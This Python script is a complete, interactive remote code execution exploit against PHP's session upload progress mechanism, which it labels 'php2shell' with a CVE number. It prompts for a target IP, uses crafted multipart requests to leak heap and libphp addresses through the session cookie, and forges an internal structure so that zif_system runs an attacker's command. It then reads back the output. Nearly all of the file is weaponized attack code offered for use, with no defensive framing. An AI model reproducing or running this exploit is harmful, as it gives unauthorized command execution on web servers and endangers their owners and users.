#!/usr/bin/env python3
import posixpath
import re
import ssl
import struct
import socket
import sys
import threading
import time
import urllib.parse
import uuid
from collections import Counter

SID = b"attacksessionid0001"
MAX_CMD = 14

BOOKWORM = {
    "stage1_n": 841,
    "stage2_t": 406,
    "stage2_v": 16,
    "stage3_pads": [(31, 31)] * 6,
    "stage3_carrier": True,
    "htdata": 0x690D8,
    "zif": 0x43A870,
    "dtor": 0x613C50,
}

LAB = {
    "stage1_n": 892,
    "stage2_t": 443,
    "stage2_v": 1,
    "stage3_pads": [(8, 7)] + [(7, 7)] * 5,
    "stage3_carrier": False,
    "htdata": 0x6E0D8,
    "zif": 0x43A870,
    "dtor": 0x613C50,
}

def build_multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + p["name"].encode() + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)

def parse_cookie(resp):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))

def chunk_base_from_cookie(raw):
    if len(raw) < 1000:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0

def libphp_base_from_cookie(raw, dtor_offset):
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0

class Target:
    def __init__(self, host, port, tls, path, timeout=30.0):
        self.host = host
        self.port = port
        self.tls = tls
        self.path = path
        self.timeout = timeout

    def log(self, msg):
        print(msg, flush=True)

    def _connect(self):
        last = None
        for _ in range(10):
            try:
                s = socket.create_connection((self.host, self.port), timeout=self.timeout)
                if self.tls:
                    s = ssl._create_unverified_context().wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last

    def post(self, body, boundary, read_cap=1 << 20, timeout=None, extra_headers=None):
        extra = ""
        for k, v in (extra_headers or {}).items():
            extra += k + ": " + v + "\r\n"
        hdr = ("POST " + self.path + " HTTP/1.1\r\n"
               "Host: " + self.host + ":" + str(self.port) + "\r\n" + extra +
               "Content-Type: multipart/form-data; boundary=" + boundary.decode() + "\r\n"
               "Content-Length: " + str(len(body)) + "\r\n"
               "Connection: close\r\n\r\n").encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)
        data = bytearray()

        def reader():
            try:
                while len(data) < read_cap:
                    c = s.recv(65536)
                    if not c:
                        break
                    data.extend(c)
            except OSError:
                pass

        t = threading.Thread(target=reader, daemon=True)
        t.start()
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass
            t.join(timeout=(timeout or self.timeout) + 1.0)
            return bytes(data)
        finally:
            s.close()

    def get(self, path, read_cap=1 << 20):
        hdr = ("GET " + path + " HTTP/1.1\r\n"
               "Host: " + self.host + ":" + str(self.port) + "\r\n"
               "Connection: close\r\n\r\n").encode()
        s = self._connect()
        s.settimeout(self.timeout)
        try:
            s.sendall(hdr)
            data = bytearray()
            try:
                while len(data) < read_cap:
                    c = s.recv(65536)
                    if not c:
                        break
                    data += c
            except OSError:
                pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d+)", head)
        return (int(m.group(1)) if m else 0), body

class Exploit:
    def __init__(self, target, cmd, profile, zif_offset, dtor_offset, htdata_offset, huge_mb=12):
        self.t = target
        self.cmd = cmd.encode()
        self.zif_offset = zif_offset
        self.dtor_offset = dtor_offset
        self.htdata_offset = htdata_offset
        self.huge_mb = huge_mb
        self.stage1_n = profile["stage1_n"]
        self.stage2_t = profile["stage2_t"]
        self.stage2_v = profile["stage2_v"]
        self.stage3_pads = list(profile["stage3_pads"])
        self.stage3_carrier = profile["stage3_carrier"]

    def _big_field(self):
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _file_part(self):
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def rotate(self):
        self.t.log("[*] Rotating worker over HTTP")
        parts = [{"name": ("f%04d" % i)[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
                    read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    def stage1(self):
        parts = [{"name": "p%04d" % i, "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(self.stage1_n):
            val = (("v%04d" % i) + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": val.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
        return chunk_base_from_cookie(parse_cookie(resp))

    def stage2(self):
        parts = [{"name": ("f%04d" % i)[:5], "data": b"x" * 39} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(983):
            cnt = 16 if i == self.stage2_t else 1
            for j in range(cnt):
                parts.append({"name": "a%04d[%d]" % (i, j), "data": b"x" * self.stage2_v})
        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20)
        return libphp_base_from_cookie(parse_cookie(resp), self.dtor_offset)

    def _fake_payload(self, htdata, zif):
        cmd = self.cmd
        ht = bytearray(b"\x00" * 167)
        struct.pack_into("<II", ht, 0x00, 1, 7)
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
        struct.pack_into("<II", ht, 0x18, 1, 1)
        struct.pack_into("<II", ht, 0x20, 8, 0)
        struct.pack_into("<Q", ht, 0x28, 0)
        struct.pack_into("<Q", ht, 0x30, zif)
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)
        struct.pack_into("<Q", ht, E + 0x08, 0)
        struct.pack_into("<Q", ht, E + 0x10, zif)
        struct.pack_into("<Q", ht, E + 0x18, 0)
        struct.pack_into("<Q", ht, E + 0x20, 0)
        struct.pack_into("<I", ht, E + 0x28, 0)
        struct.pack_into("<I", ht, E + 0x2C, 1)
        struct.pack_into("<Q", ht, E + 0x30, 0)
        struct.pack_into("<Q", ht, E + 0x38, 0)
        struct.pack_into("<I", ht, E + 0x40, 0)
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
        struct.pack_into("<I", ht, E + 0x58, 6)
        struct.pack_into("<II", ht, 0x80, 1, 0x106)
        struct.pack_into("<Q", ht, 0x88, 0)
        struct.pack_into("<Q", ht, 0x90, len(cmd))
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0
        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)
        struct.pack_into("<Q", ref, 0x18, htdata)
        struct.pack_into("<Q", ref, 0x20, 0x307)
        struct.pack_into("<Q", ref, 0x28, 0)
        return bytes(ht), bytes(ref)

    def stage3(self, htdata, zif):
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for i, (nl, vl) in enumerate(self.stage3_pads):
            name = (("p%0*d" % (nl - 1, i)) if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self._file_part(), self._big_field()]
        extra = None
        if self.stage3_carrier:
            extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout), extra_headers=extra)
        time.sleep(0.3)
        ht, ref = self._fake_payload(htdata, zif)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        if self.stage3_carrier:
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for i in range(2):
                parts.append({"name": "f%02d" % i, "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": ("a%030d" % i)[:31], "data": ht})
        else:
            for i in range(15):
                parts.append({"name": ("a%030d" % i)[:31], "data": ht})
            for i in range(2):
                parts.append({"name": "f%02d" % i, "data": ref})
        self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30.0)

def main():
    raw = input("[+] Insert the IP address of the domain vulnerable to php2shell (CVE-2026-109618): ").strip()
    if not raw:
        sys.exit(1)
    tls = False
    if raw.lower().startswith("https://"):
        tls = True
        raw = raw[8:]
    elif raw.lower().startswith("http://"):
        raw = raw[7:]
    raw = raw.rstrip("/")
    if ":" in raw:
        host, ps = raw.rsplit(":", 1)
        try:
            port = int(ps)
        except ValueError:
            host = raw
            port = 443 if tls else 80
    else:
        host = raw
        port = 443 if tls else 80

    path = input("[+] PHP endpoint path [/index.php]: ").strip() or "/index.php"
    if not path.startswith("/"):
        path = "/" + path

    outfile = "p2s" + uuid.uuid4().hex[:3] + ".out"
    cmd = input("[+] Command (max " + str(MAX_CMD) + " bytes) [id>" + outfile + "]: ").strip() or ("id>" + outfile)
    if len(cmd.encode()) > MAX_CMD:
        print("[!] Command longer than " + str(MAX_CMD) + " bytes, truncating")
        cmd = cmd.encode()[:MAX_CMD].decode("latin1")

    fetch = input("[+] Output path to fetch [" + posixpath.dirname(path) + "/" + outfile + "]: ").strip()
    if not fetch:
        fetch = posixpath.dirname(path) + "/" + outfile
    if not fetch.startswith("/"):
        fetch = "/" + fetch

    prof = input("[+] Target profile (bookworm/lab) [bookworm]: ").strip().lower() or "bookworm"
    profile = LAB if prof == "lab" else BOOKWORM

    z = input("[+] zif_system offset [0x%x]: " % profile["zif"]).strip()
    zif_offset = int(z, 0) if z else profile["zif"]
    d = input("[+] zval_ptr_dtor offset [0x%x]: " % profile["dtor"]).strip()
    dtor_offset = int(d, 0) if d else profile["dtor"]
    h = input("[+] fake-structure offset [0x%x]: " % profile["htdata"]).strip()
    htdata_offset = int(h, 0) if h else profile["htdata"]
    mb = input("[+] OOM field size in MB (must exceed memory_limit) [12]: ").strip()
    huge_mb = int(mb) if mb else 12

    t = Target(host, port, tls, path)
    ex = Exploit(t, cmd, profile, zif_offset, dtor_offset, htdata_offset, huge_mb)
    t.log("[*] Target http" + ("s" if tls else "") + "://" + host + ":" + str(port) + path)
    t.log("[*] Offsets: zif=0x%x dtor=0x%x htdata=0x%x" % (zif_offset, dtor_offset, htdata_offset))

    ex.rotate()

    chunk = 0
    for attempt in range(1, 4):
        t.log("[*] Stage 1: heap base leak (attempt %d/3)" % attempt)
        chunk = ex.stage1()
        if chunk:
            t.log("[+] Zend MM chunk base = 0x%x" % chunk)
            break
        t.log("[-] Heap leak missed")
        ex.rotate()
    if not chunk:
        print("[-] Heap leak failed")
        sys.exit(1)
    ex.rotate()

    libphp = 0
    for attempt in range(1, 4):
        t.log("[*] Stage 2: libphp base leak (attempt %d/3)" % attempt)
        libphp = ex.stage2()
        if libphp:
            t.log("[+] libphp base = 0x%x" % libphp)
            break
        t.log("[-] libphp leak missed")
        ex.rotate()
    if not libphp:
        print("[-] libphp leak failed")
        sys.exit(1)
    ex.rotate()

    htdata = chunk + htdata_offset
    zif = libphp + zif_offset
    t.log("[*] Stage 3: HTDATA=0x%x ZIF=0x%x" % (htdata, zif))

    for attempt in range(1, 6):
        try:
            ex.stage3(htdata, zif)
        except OSError as e:
            t.log("[-] Request error: " + str(e))
        time.sleep(0.8)
        status, body = t.get(fetch)
        out = body.decode("latin1", "replace").strip()
        if status == 200 and out:
            t.log("[+] Command executed on attempt %d" % attempt)
            print("[+] Output of '" + cmd + "':")
            print("----------------------------------------")
            print(out)
            print("----------------------------------------")
            return
        t.log("[-] Stage 3 attempt %d: no proof yet" % attempt)
        ex.rotate()

    print("[-] No proof read. The command may have executed blind (check " + fetch + ")")

if __name__ == "__main__":
    main()
